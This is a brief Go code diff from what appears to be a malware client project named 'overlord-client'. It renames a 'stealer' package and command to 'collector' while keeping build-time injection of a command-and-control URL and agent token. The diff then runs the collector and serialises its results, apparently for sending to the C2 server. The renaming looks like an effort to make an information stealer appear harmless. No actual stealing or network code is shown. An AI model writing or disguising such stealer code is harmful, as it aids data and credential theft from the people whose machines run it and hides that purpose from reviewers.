@@ -7,13 +7,13 @@ import (
 	"net/http"
 	"time"
 
-	"overlord-client/internal/stealer"
+	"overlord-client/internal/collector"
 )
 
 // Injected at build time via -ldflags:
 //
-//	-X overlord-client/cmd/stealer/main.DefaultC2URL=https://...
-//	-X overlord-client/cmd/stealer/main.DefaultAgentToken=...
+//	-X overlord-client/cmd/collector/main.DefaultC2URL=https://...
+//	-X overlord-client/cmd/collector/main.DefaultAgentToken=...
 var (
 	DefaultC2URL      = ""
 	DefaultAgentToken = ""
@@ -24,7 +24,7 @@ func main() {
 		return
 	}
 
-	r := stealer.Run()
+	r := collector.Run()
 
 	data, err := json.Marshal(r)
 	if err != nil {
